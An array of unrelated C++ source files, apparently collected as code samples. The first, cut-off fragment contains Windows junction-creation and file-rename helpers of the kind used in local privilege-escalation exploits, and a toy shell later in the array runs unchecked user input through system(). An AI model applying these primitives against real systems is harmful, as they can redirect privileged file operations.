tmpfile[MAX_PATH] = { 0x0 };\n\tRPC_WSTR str_uuid;\n\tUUID uuid = { 0 };\n\tUuidCreate(&uuid);\n\tUuidToString(&uuid, &str_uuid);\n\t_swprintf(tmpfile, L\"\\\\??\\\\C:\\\\windows\\\\temp\\\\%s\", str_uuid);\n\tsize_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t));\n\tFILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz);\n\tIO_STATUS_BLOCK io = { 0 };\n\trename_info->ReplaceIfExists = TRUE;\n\trename_info->RootDirectory = NULL;\n\trename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040;\n\trename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t);\n\tmemcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t));\n\tNTSTATUS status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65);\n\tif (status != 0) {\n\t\treturn FALSE;\n\t}\n\treturn TRUE;\n}\n\nHANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion) {\n\tUNICODE_STRING ufile;\n\tHANDLE hDir;\n\tpRtlInitUnicodeString(&ufile, file);\n\tOBJECT_ATTRIBUTES oa = { 0 };\n\tIO_STATUS_BLOCK io = { 0 };\n\tInitializeObjectAttributes(&oa, &ufile, OBJ_CASE_INSENSITIVE, NULL, NULL);\n\n\tretcode = pNtCreateFile(&hDir, access, &oa, &io, NULL, FILE_ATTRIBUTE_NORMAL, share, dispostion, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);\n\n\tif (!NT_SUCCESS(retcode)) {\n\t\treturn NULL;\n\t}\n\treturn hDir;\n}\nLPWSTR  BuildPath(LPCWSTR path) {\n\twchar_t ntpath[MAX_PATH];\n\tswprintf(ntpath, L\"\\\\??\\\\%s\", path);\n\treturn ntpath;\n}\nvoid load() {\n\tHMODULE ntdll = LoadLibraryW(L\"ntdll.dll\");\n\tif (ntdll != NULL) {\n\t\tpRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, \"RtlInitUnicodeString\");\n\t\tpNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, \"NtCreateFile\");\n\t\tpNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, \"NtSetInformationFile\");\n\n\t}\n\tif (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL) {\n\t\tprintf(\"Cannot load api's %d\\n\", GetLastError());\n\t\texit(0);\n\t}\n}\nBOOL CreateJunction(LPCWSTR dir, LPCWSTR target) {\n\tHANDLE hJunction;\n\tDWORD cb;\n\twchar_t printname[] = L\"\";\n\tHANDLE hDir;\n\thDir = CreateFile(dir, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);\n\n\tif (hDir == INVALID_HANDLE_VALUE) {\n\t\tprintf(\"[!] Failed to obtain handle on directory %ls.\\n\", dir);\n\t\treturn FALSE;\n\t}\n\n\tSIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);\n\tSIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);\n\tSIZE_T PathLen = TargetLen + PrintnameLen + 12;\n\tSIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));\n\tPREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);\n\tData->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;\n\tData->ReparseDataLength = PathLen;\n\tData->Reserved = 0;\n\tData->MountPointReparseBuffer.SubstituteNameOffset = 0;\n\tData->MountPointReparseBuffer.SubstituteNameLength = TargetLen;\n\tmemcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);\n\tData->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);\n\tData->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;\n\tmemcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);\n\n\tif (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)\n\t{\n\t\tprintf(\"[+] Junction %ls -> %ls created!\\n\", dir, target);\n\t\tfree(Data);\n\t\treturn TRUE;\n\n\t}\n\telse\n\t{\n\t\tprintf(\"[!] Error on creating junction %ls -> %ls : Error code %d\\n\", dir, target, GetLastError());\n\t\tfree(Data);\n\t\treturn FALSE;\n\t}\n}\nBOOL DeleteJunction(LPCWSTR path) {\n\tREPARSE_GUID_DATA_BUFFER buffer = { 0 };\n\tBOOL ret;\n\tbuffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;\n\tDWORD cb = 0;\n\tIO_STATUS_BLOCK io;\n\n\n\tHANDLE hDir;\n\thDir = CreateFil",
    "#include<iostream>\r\n#include<cstdlib>\r\n#include<ctime>\r\nusing namespace std;\r\nint main()\r\n{\r\n    srand(time(NULL));\r\n    int user = 0;\r\n    int computer = 0;\r\n    cout<<\"WELCOME TO THE ROCK PAPER SCISSOR GAME..\"<<endl;\r\n    cout<<\"You can choose any one of the following\"<<endl;\r\n    cout<<\"1.For Rock\"<<endl;\r\n    cout<<\"2.For Paper\"<<endl;\r\n    cout<<\"3.For Scissor\"<<endl;\r\n    cin>>user;\r\n    if(user==1){\r\n        cout<<\"You choose Rock\"<<endl;\r\n    }\r\n    else if(user==2){\r\n        cout<<\"You choose Paper\"<<endl;\r\n    }\r\n    else{\r\n        cout<<\"You choose Scissor\"<<endl;\r\n    }\r\n\r\n    computer = rand()%3+1;\r\n    if(computer==1){\r\n        cout<<\"Computer chooses Rock\"<<endl;\r\n    }\r\n    else if(computer==2){\r\n        cout<<\"Computer chooses Paper\"<<endl;\r\n    }\r\n    else{\r\n        cout<<\"Computer chooses Scissor\"<<endl;\r\n    }\r\n\r\n    //match\r\n    if(user==computer){\r\n        cout<<\"Match is Tie..\"<<endl;\r\n    }\r\n\r\n    //user..>Rock\r\n    else if(user==1){\r\n        if(computer==2){\r\n            cout<<\"You Lose!\"<<endl;\r\n        }\r\n        if(computer==3){\r\n            cout<<\"Congratulations..You win!\"<<endl;\r\n        }\r\n    }\r\n\r\n    //user..>paper\r\n    else if(user==2){\r\n        if(computer==1){\r\n            cout<<\"Congratulations..You win!\"<<endl;\r\n        }\r\n        if(computer==3){\r\n             cout<<\"You Lose!\"<<endl;\r\n        }\r\n    }\r\n\r\n    //user..>scissor\r\n    else if(user==3){\r\n        if(computer==1){\r\n              cout<<\"You Lose!\"<<endl;\r\n        }\r\n        if(computer==2){\r\n            cout<<\"Congratulations..You win!\"<<endl;\r\n        }\r\n        }\r\n        return 0;\r\n    }\r\n\r\n\r\n\r\n",
    "//\n// Created by alman on 01/07/2024.\n//\n\n#include \"Storehouse.h\"\n#include \"Article.h\"\n#include <vector>\n#include <algorithm>\n#include <stdexcept>\n\n\n\n\n    Storehouse::Storehouse(int size) : maxSize(size) {\n        if (size <= 0) {\n            throw invalid_argument(\"he Number have to be bigger than 0 \");\n        }\n    }\n\n    Storehouse::Storehouse() : Storehouse(10) {}\n\n    void Storehouse::addArticle(Article* article) {\n        if (isFull()) {\n            throw  runtime_error(\"Warehouse is Full\");\n        }\n        articles.push_back(article);\n        insertElment++;\n    }\n\n    void Storehouse::removeArticle(int articleNumber) {\n\n            auto it = std::find_if(articles.begin(), articles.end(),\n                [articleNumber](const Article* a) { return a->getArticleNumber() == articleNumber; });\n            if (it != articles.end()) {\n                delete *it;\n                articles.erase(it);\n\n            }else {\n                    throw invalid_argument(\"Article not found\");\n                }\n\n            }\n\n\n\n\n    void Storehouse::increaseStock(int articleNumber, int amount) const {\n        Article* article = findArticle(articleNumber);\n        if (article) {\n            article->increaseStock(amount);\n        }\n    }\n\n    void Storehouse::reduceStock(int articleNumber, int amount) const {\n        Article* article = findArticle(articleNumber);\n        if (article) {\n            article->reduceStock(amount);\n        }else {\n            throw invalid_argument(\"Article not found\");\n        }\n    }\n\n    void Storehouse::changePrice(int articleNumber, int percent) const {\n        Article* article = findArticle(articleNumber);\n        if (article) {\n            article->changePrice(percent);\n        }\n    }\n\n    void Storehouse::changePrice(int percent) {\n        for (Article* article : articles) {\n            article->changePrice(percent);\n        }\n    }\n\n    double Storehouse::calculateTotalValue() const {\n        double total = 0;\n        for (const Article* article : articles) {\n            total += article->getPrice() * article->getStock();\n        }\n        return total;\n    }\n\n    Article* Storehouse::findArticle(int articleNumber) const{\n        for (Article* article : articles) {\n            if (article->getArticleNumber() == articleNumber) {\n                return article;\n            }\n        }\n        return nullptr;\n    }\n\n    bool Storehouse::isFull() const { return insertElment == maxSize; }\n    bool Storehouse::isEmpty() const { return articles.empty(); }\n    int Storehouse::printArticleCount() const { return insertElment; }\n\n    string Storehouse::toString() const {\n        string result = \"Warehouse Status:\\n\";\n        for (const Article* article : articles) {\n            result += article->toString() + \"\\n\";\n        }\n        return result;\n    }\n\n\n    Storehouse::~Storehouse() {\n        for (Article* article : articles) {\n            delete article;\n        }\n    }\n\n",
    "/****************************************************************************\n** Meta object code from reading C++ file 'FriendListProxyModel.h'\n**\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.6.3)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include \"../../Client_new/FriendListProxyModel.h\"\n#include <QtCore/qmetatype.h>\n\n#if __has_include(<QtCore/qtmochelpers.h>)\n#include <QtCore/qtmochelpers.h>\n#else\nQT_BEGIN_MOC_NAMESPACE\n#endif\n\n\n#include <memory>\n\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'FriendListProxyModel.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 68\n#error \"This file was generated using the moc from 6.6.3. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\n#ifndef Q_CONSTINIT\n#define Q_CONSTINIT\n#endif\n\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nQT_WARNING_DISABLE_GCC(\"-Wuseless-cast\")\nnamespace {\n\n#ifdef QT_MOC_HAS_STRINGDATA\nstruct qt_meta_stringdata_CLASSFriendListProxyModelENDCLASS_t {};\nconstexpr auto qt_meta_stringdata_CLASSFriendListProxyModelENDCLASS = QtMocHelpers::stringData(\n    \"FriendListProxyModel\"\n);\n#else  // !QT_MOC_HAS_STRING_DATA\nstruct qt_meta_stringdata_CLASSFriendListProxyModelENDCLASS_t {\n    uint offsetsAndSizes[2];\n    char stringdata0[21];\n};\n#define QT_MOC_LITERAL(ofs, len) \\\n    uint(sizeof(qt_meta_stringdata_CLASSFriendListProxyModelENDCLASS_t::offsetsAndSizes) + ofs), len \nQ_CONSTINIT static const qt_meta_stringdata_CLASSFriendListProxyModelENDCLASS_t qt_meta_stringdata_CLASSFriendListProxyModelENDCLASS = {\n    {\n        QT_MOC_LITERAL(0, 20)   // \"FriendListProxyModel\"\n    },\n    \"FriendListProxyModel\"\n};\n#undef QT_MOC_LITERAL\n#endif // !QT_MOC_HAS_STRING_DATA\n} // unnamed namespace\n\nQ_CONSTINIT static const uint qt_meta_data_CLASSFriendListProxyModelENDCLASS[] = {\n\n // content:\n      12,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       0,    0, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       0,       // signalCount\n\n       0        // eod\n};\n\nQ_CONSTINIT const QMetaObject FriendListProxyModel::staticMetaObject = { {\n    QMetaObject::SuperData::link<IFriendListProxyModel::staticMetaObject>(),\n    qt_meta_stringdata_CLASSFriendListProxyModelENDCLASS.offsetsAndSizes,\n    qt_meta_data_CLASSFriendListProxyModelENDCLASS,\n    qt_static_metacall,\n    nullptr,\n    qt_incomplete_metaTypeArray<qt_meta_stringdata_CLASSFriendListProxyModelENDCLASS_t,\n        // Q_OBJECT / Q_GADGET\n        QtPrivate::TypeAndForceComplete<FriendListProxyModel, std::true_type>\n    >,\n    nullptr\n} };\n\nvoid FriendListProxyModel::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    (void)_o;\n    (void)_id;\n    (void)_c;\n    (void)_a;\n}\n\nconst QMetaObject *FriendListProxyModel::metaObject() const\n{\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\n}\n\nvoid *FriendListProxyModel::qt_metacast(const char *_clname)\n{\n    if (!_clname) return nullptr;\n    if (!strcmp(_clname, qt_meta_stringdata_CLASSFriendListProxyModelENDCLASS.stringdata0))\n        return static_cast<void*>(this);\n    return IFriendListProxyModel::qt_metacast(_clname);\n}\n\nint FriendListProxyModel::qt_metacall(QMetaObject::Call _c, int _id, void **_a)\n{\n    _id = IFriendListProxyModel::qt_metacall(_c, _id, _a);\n    return _id;\n}\nQT_WARNING_POP\n",
    "#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <iostream>\n#include <unistd.h>\n#include <arpa/inet.h>\n#include \"Chat.h\"\n\n\nvoid sendCommand(int sock, std::string& command){\n    write(sock, command.c_str(), command.size());\n}\n\n\nvoid receiveResponse(int sock){\n    char buf[1024] = {0};\n    read(sock, buf, 1024);\n    std::cout << buf << std::endl;\n}\n\n\nchar buf[1024];\n\nint main(){\n\n    Chat chat;\n\n    using namespace std;\n\n    int sock;\n    struct sockaddr_in addr;\n\n    sock = socket(AF_INET, SOCK_STREAM, 0);\n    if(sock < 0){\n        cout << \"error socket\" << endl;\n        exit(1);\n    }\n\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons(8000);\n    addr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n\n    if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0){\n        cout << \"error connect\" << endl;\n        exit(2);\n    }\n\n    cout << \"connection...\" << endl;\n    string login, password, receiver, content, action, data;\n\n    cout << \"1. Registration\\n\"\n         << \"2. Sign in\\n\";\n\n    int choice = 0;\n    cin >> choice;\n\n\n    if(choice == 1){\n        action = \"REGISTR\";\n        cout << \"Enter your username: \";\n        cin >> login;\n        cout << \"Enter your password: \";\n        cin >> password;\n        data = action + \" \" + login + \" \" + password + \"\\n\";\n        sendCommand(sock, data);\n        receiveResponse(sock);\n    }\n    if(choice == 2){\n        action = \"LOGIN\";\n        cout << \"Enter your username: \";\n        cin >> login;\n        cout << \"Enter your password: \";\n        cin >> password;\n        data = action + \" \" + login + \" \" + password + \"\\n\";\n        sendCommand(sock, data);\n        receiveResponse(sock);\n    }\n    \n    while(true){\n        cout << \"1. Send a message\" << endl;\n        cout << \"2. Get messages\" << endl;\n        cout << \"3. Exit\" << endl;\n\n        cin >> choice;\n        cin.ignore();\n\n        if(choice == 1){\n            action = \"SEND\";\n            cout << \"Enter receiver username: \";\n            cin >> login;\n            cin.clear();\n            cin.ignore();\n            cout << \"Enter message:\" << endl;\n            getline(cin, content);\n            data = action + \" \" + login + \" \" + receiver + \" \" + content + \"\\n\";\n            sendCommand(sock, data);\n            receiveResponse(sock);\n        }\n\n        else if(choice == 2){\n            action = \"GET MESSAGE\";\n            data = action + \" \" +  login + \"\\n\";\n            sendCommand(sock, data);\n            receiveResponse(sock);\n        }\n\n        else if(choice == 3){\n            close(sock);\n            break;\n        }\n    }\n\n    return 0;\n}",
    "#include<bits/stdc++.h>\nusing namespace std;\nclass Node {\n    public:\n    int val;\n    Node * next;\n    Node * prev;\n    Node (int val){\n        this->val =val;\n        this->next= NULL;\n        this->prev = NULL;\n    }\n};\nvoid print_normal(Node * head)\n{\n    Node *tmp = head;\n    while (tmp != NULL)\n    {\n        cout << tmp->val << \" \";\n        tmp = tmp->next; \n    }\n    cout << endl;\n    \n}\nint size(Node * head){\n    int count = 0;\n    Node * tmp = head;\n    while (tmp != NULL)\n    {\n        count ++;\n        tmp = tmp->next;\n    }\n    return count;\n}\n\nvoid delete_any_pos(Node * &head, Node *& tail, int pos)\n{\n    Node *tmp = head;\n    if (pos == 0)\n    {\n        head = head->next;\n        if (head !=NULL)\n        {\n            head->prev = NULL;\n        }\n        delete tmp;\n        return;\n        \n    }\n    else if (pos == size(head))\n    {\n        Node * deleteNode = tail;\n        tail = tail->prev;\n        delete deleteNode;\n        tail->next = NULL;\n        return;\n\n    }\n    \n    \n    for (int i = 1; i <= pos -1; i++)\n    {\n        tmp = tmp->next;\n    }\n    Node * deleteNode = tmp->next;\n    tmp->next = tmp->next->next;\n    tmp->next->prev= tmp;\n    delete deleteNode;\n}\nint main()\n{\n    Node * head = new Node(10);\n    Node * a = new Node(20);\n    Node * b = new Node(30);\n    Node * c = new Node(40);\n    Node * tail = c;\n    head->next=a;\n    a->prev = head;\n    a->next = b;\n    b->prev = a;\n    b->next = c;\n    c->prev = b;\n    int pos;\n    cin>> pos;\n   \n    delete_any_pos(head, tail, pos);\n     print_normal(head);\n    return 0;\n}\n",
    "#include <iostream>\n#include <filesystem>\n\nusing std::cout;\nusing std::string;\n\nstring available_commands[] = {\"exit\", \"echo\", \"pwd\", \"cd\", \"chex\", \"append\", \"run\", \"runl\", \"{file_name}\", \"dir\", \"help\"}; // Add more commands here\n\nnamespace commands\n{\n    // Phase 1 commands\n    void echoCommand(string text)\n    {\n        if (text == \"echo\")\n        {\n            cout << \"Echo requires an input\\n\";\n        }\n        else\n        {\n            cout << text << \"\\n\";\n        }\n    }\n\n    void pwdCommand()\n    {\n        string current_dir = std::filesystem::current_path();\n        for (const auto &entry : std::filesystem::directory_iterator(current_dir))\n        {\n            cout << entry.path().filename() << \"\\n\";\n        }\n    }\n\n    void cdCommand(string path)\n    {\n        try\n        {\n            std::filesystem::current_path(path);\n        }\n        catch (const std::exception &e)\n        {\n            cout << \"Cannot set current path: No such file or directory\\n\";\n        }\n    }\n\n    // Phase 2 commands\n    void checkExecutionCommand(std::filesystem::perms p, string fileName)\n    {\n        if (fileName == \"chex\")\n        {\n            cout << \"Plese enter a filename\\n\";\n            return;\n        }\n\n        using std::filesystem::perms;\n        auto show = [=](char op, perms perm)\n        {\n            if ((perms::none == (perm & p) ? '-' : op) == '-')\n            {\n                cout << fileName << \": Not executable\\n\";\n            }\n            else if ((perms::none == (perm & p) ? '-' : op) == op)\n            {\n                cout << fileName << \": Is executable\\n\";\n            }\n        };\n\n        show('x', perms::owner_exec);\n    }\n\n    void appendCommand(string path)\n    {\n        if (path == \"append\")\n        {\n            cout << \"Please enter a path to the file\\n\";\n            return;\n        }\n\n        string xdg_open = \"xdg-open \";\n        xdg_open.append(path);\n        system(xdg_open.c_str());\n    }\n\n    void runCommand(string file_name)\n    {\n        if (file_name == \"run\")\n        {\n            cout << \"Please enter a filename\";\n            return;\n        }\n\n        string runFile = \"./\";\n        runFile.append(file_name);\n        system(runFile.c_str());\n    }\n\n    void runLocalCommand(string path)\n    {\n        if (path == \"runl\")\n        {\n            cout << \"Please enter a correct path\\n\";\n            return;\n        }\n\n        system(path.c_str());\n    }\n\n    void curlyBracesCommand(string input)\n    {\n        string current_dir = std::filesystem::current_path();\n\n        string::size_type input_begin = input.find(\"{\") + 1;\n        string::size_type input_end = input.find(\"}\", input_begin);\n        input = input.substr(input_begin, input_end - input_begin);\n        int input_length = input.length();\n\n        // Check if there is input in curly braces\n        if (input_length == 0)\n        {\n            cout << \"Please enter a file name\\n\";\n            return;\n        }\n\n        // If file is inside of directory\n        bool file_found = false;\n        for (const auto &entry : std::filesystem::directory_iterator(current_dir))\n        {\n\n            string token = entry.path().filename();\n            if (token == input)\n            {\n                cout << token << \": inside current directory\\n\";\n                file_found = true;\n                break;\n            }\n        }\n\n        if (file_found == false)\n        {\n            cout << input << \": Not inside current directory\\n\";\n            return;\n        }\n\n        // If file is executable\n        checkExecutionCommand(std::filesystem::status(input).permissions(), input);\n    }\n\n    // Custom Commands\n    void dirCommand()\n    {\n        cout << \"Current Direcotry: \\n\";\n        cout << std::filesystem::current_path() << \"\\n\";\n    }\n\n    void helpCommand()\n    {\n        cout << \"Available Commands: \\n\";\n        int commands_length = std::end(available_commands) - std::begin(available_commands);\n        for (int i = 1; i < commands_length; i++)\n        {\n            cout << i << \". \" << available_commands[i] << \"\\n\";\n        }\n    }\n}\n\nvoid checkCommand(string user_input)\n{\n    string command = user_input.substr(0, user_input.find(' '));\n    bool command_is_available = false;\n    int available_commands_len = std::end(available_commands) - std::begin(available_commands);\n\n    for (int i = 0; i < available_commands_len; i++)\n    {\n\n        if (command == available_commands[i])\n        {\n            command_is_available = true;\n            break;\n        }\n    }\n    if (command_is_available == false)\n    {\n        cout << command << \": command not found\\n\";\n    }\n}\n\nstring commandExecution(string user_input, bool curly_braces = false)\n{\n    using namespace commands;\n\n    string command = user_input.substr(0, user_input.find(' '));\n    string command_input = user_input.substr(user_input.find_first_of(\" \") + 1);\n\n    if (command == \"exit\")\n    {\n        return \"exit\";\n    }\n\n    // Phase 1 commands\n    if (command == \"echo\")\n ",
    "#include \"Person.h\"\n\n\nPerson :: Person () : firstName {\"None\"}, lastName {\"None\"}, userName {\"None\"}, password {\"None\"} {\n\n}\n\nPerson :: Person (\n        const std::string & first,\n        const std::string & last,\n        const std::string & user_name,\n        const std::string & pass) \n: firstName{first}, lastName{last}, userName{user_name}, password{pass} {\n\n}\n\n\n// Setters \nvoid Person :: setFirstName(const std::string & first) {\n    this->firstName = first;\n}\n\nvoid Person :: setLastName(const std::string & last) { \n    this->lastName = last;\n}\n\nvoid Person :: setUserName(const std::string & user_name) {\n    this->userName = user_name; \n}\n\nvoid Person :: setPassword(const std::string & pass) {\n    this->password = pass;\n}\n\n\n// Getters \nstd::string Person :: getFirstName() const {\n    return firstName; \n}\n\nstd::string Person :: getLastName() const {\n    return lastName;\n}\n\nstd::string Person :: getUserName() const {\n    return userName;\n}\n\nstd::string Person :: getPassword() const {\n    return password;\n}\n\n// Display method\nvoid Person :: display () const {\n    cout << *this << endl;\n}\n\n// I/O stream Operators\nstd::ostream& operator << (std::ostream& os, const Person& p) {\n    os << endl;\n    os << \"First Name: \" << p.firstName << endl; \n    os << \"Last Name : \" << p.lastName << endl; \n    os << \"User Name : \" << p.userName << endl; \n    os << \"Password  : \" << p.password << endl; \n\n    return os; \n}\n\nstd::istream& operator >> (std::istream& is, Person& p) {\n\n    cout << \"\\nEnter first name: \"; is >> p.firstName;\n    cout << \"Enter last name : \"; is >> p.lastName;\n    cout << \"Enter user name : \"; is >> p.userName;\n    cout << \"Enter password  : \"; is >> p.password;\n    return is;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_projects\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"stdafx.h\"\n\nusing namespace System;\nusing namespace System::Reflection;\nusing namespace System::Runtime::CompilerServices;\nusing namespace System::Runtime::InteropServices;\nusing namespace System::Security::Permissions;\n\n//\n// \u041e\u0431\u0449\u0438\u0435 \u0441\u0432\u0435\u0434\u0435\u043d\u0438\u044f \u043e\u0431 \u044d\u0442\u043e\u0439 \u0441\u0431\u043e\u0440\u043a\u0435 \u043f\u0440\u0435\u0434\u043e\u0441\u0442\u0430\u0432\u043b\u044f\u044e\u0442\u0441\u044f \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u043c \u043d\u0430\u0431\u043e\u0440\u043e\u043c\n// \u0430\u0442\u0440\u0438\u0431\u0443\u0442\u043e\u0432. \u041e\u0442\u0440\u0435\u0434\u0430\u043a\u0442\u0438\u0440\u0443\u0439\u0442\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u044d\u0442\u0438\u0445 \u0430\u0442\u0440\u0438\u0431\u0443\u0442\u043e\u0432, \u0447\u0442\u043e\u0431\u044b \u0438\u0437\u043c\u0435\u043d\u0438\u0442\u044c\n// \u043e\u0431\u0449\u0438\u0435 \u0441\u0432\u0435\u0434\u0435\u043d\u0438\u044f \u043e\u0431 \u044d\u0442\u043e\u0439 \u0441\u0431\u043e\u0440\u043a\u0435.\n//\n[assembly:AssemblyTitleAttribute(\"\u0430\u0440\u0430\")];\n[assembly:AssemblyDescriptionAttribute(\"\")];\n[assembly:AssemblyConfigurationAttribute(\"\")];\n[assembly:AssemblyCompanyAttribute(\"\")];\n[assembly:AssemblyProductAttribute(\"\u0430\u0440\u0430\")];\n[assembly:AssemblyCopyrightAttribute(\"Copyright (c)  2024\")];\n[assembly:AssemblyTrademarkAttribute(\"\")];\n[assembly:AssemblyCultureAttribute(\"\")];\n\n//\n// \u0421\u0432\u0435\u0434\u0435\u043d\u0438\u044f \u043e \u0432\u0435\u0440\u0441\u0438\u0438 \u0441\u0431\u043e\u0440\u043a\u0438 \u0441\u043e\u0441\u0442\u043e\u044f\u0442 \u0438\u0437 \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u0445 \u0447\u0435\u0442\u044b\u0440\u0435\u0445 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439:\n//\n//      \u041e\u0441\u043d\u043e\u0432\u043d\u043e\u0439 \u043d\u043e\u043c\u0435\u0440 \u0432\u0435\u0440\u0441\u0438\u0438\n//      \u0414\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u044b\u0439 \u043d\u043e\u043c\u0435\u0440 \u0432\u0435\u0440\u0441\u0438\u0438\n//      \u041d\u043e\u043c\u0435\u0440 \u043f\u043e\u0441\u0442\u0440\u043e\u0435\u043d\u0438\u044f\n//      \u0420\u0435\u0434\u0430\u043a\u0446\u0438\u044f\n//\n// \u041c\u043e\u0436\u043d\u043e \u0437\u0430\u0434\u0430\u0442\u044c \u0432\u0441\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u0438\u043b\u0438 \u043f\u0440\u0438\u043d\u044f\u0442\u044c \u043d\u043e\u043c\u0435\u0440 \u043f\u043e\u0441\u0442\u0440\u043e\u0435\u043d\u0438\u044f \u0438 \u043d\u043e\u043c\u0435\u0440 \u0440\u0435\u0434\u0430\u043a\u0446\u0438\u0438 \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e,\n// \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u044f \"*\", \u043a\u0430\u043a \u043f\u043e\u043a\u0430\u0437\u0430\u043d\u043e \u043d\u0438\u0436\u0435:\n\n[assembly:AssemblyVersionAttribute(\"1.0.*\")];\n\n[assembly:ComVisible(false)];\n\n[assembly:CLSCompliantAttribute(true)];\n\n[assembly:SecurityPermission(SecurityAction::RequestMinimum, UnmanagedCode = true)];\n",
    "\ufeff#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <tuple>\r\n#include <set>\r\n#include <stack>\r\n#include <chrono>\r\n#include <functional>\r\n#include <sstream>\r\n#include <iomanip>\r\n#include <algorithm>\r\n#include <cstdint>\r\n#include <unordered_map>\r\n#include <filesystem>\r\n#include <boost/interprocess/file_mapping.hpp>\r\n#include <boost/interprocess/mapped_region.hpp>\r\n#include <boost/unordered_map.hpp>\r\n#include <boost/container/vector.hpp>\r\n#include <boost/container/small_vector.hpp>\r\n\r\n\r\n// \u5404\u7a2e\u69cb\u9020\u4f53\r\nstruct Link {\r\n    uint8_t move;\r\n    int8_t eval_link;\r\n    bool visited;\r\n};\r\n\r\nstruct Leaf {\r\n    uint8_t move;\r\n    int8_t eval;\r\n    bool visited;\r\n};\r\n\r\n// \u30cf\u30c3\u30b7\u30e5\u95a2\u6570 \u30b7\u30f3\u30d7\u30eb\u3044\u305a\u30d9\u30b9\u30c8\r\nstruct PairHash {\r\n    std::size_t operator()(const std::pair<uint64_t, uint64_t>& p) const {\r\n        uint64_t combined = p.first + 0x9e3779b97f4a7c15ULL + (p.second << 12) + (p.second >> 4);\r\n        return std::hash<uint64_t>{}(combined);\r\n    }\r\n};\r\n\r\n// \u7b49\u4fa1\u6bd4\u8f03\u6f14\u7b97\u5b50\u306e\u5b9a\u7fa9\r\nstruct PairEqual {\r\n    template <class T1, class T2>\r\n    bool operator()(const std::pair<T1, T2>& lhs, const std::pair<T1, T2>& rhs) const {\r\n        return lhs.first == rhs.first && lhs.second == rhs.second;\r\n    }\r\n};\r\n\r\nstruct Position {\r\n    uint64_t my_stones = 0;\r\n    uint64_t opponent_stones = 0;\r\n    